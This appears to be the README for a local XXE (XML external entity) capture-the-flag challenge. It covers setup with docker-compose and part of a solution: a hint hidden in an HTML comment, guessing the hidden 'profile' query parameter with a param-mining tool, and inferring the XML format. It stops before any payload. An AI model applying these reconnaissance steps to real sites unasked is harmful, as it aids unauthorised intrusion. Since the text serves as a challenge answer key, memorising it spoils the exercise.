## XXE Challenge
## Run the below commands to get Started after cloning the repo
```
docker-compose up
```
Server will start listening on port 4446.

## Solution

1. On visiting the home page(http://localhost:4446), there is a hint in the source code in the index.html page

```
<!--       Todo: Adding UI Change for loading the profile details uploaded publicly in XML format via query param-->


```
2. User has to use paramminer or similar tool to guess the param which is **profile**.

3. After this, either user can guess the XML format or can search for the publiclyÂ XML file whose values are being reflected by default in the siter.
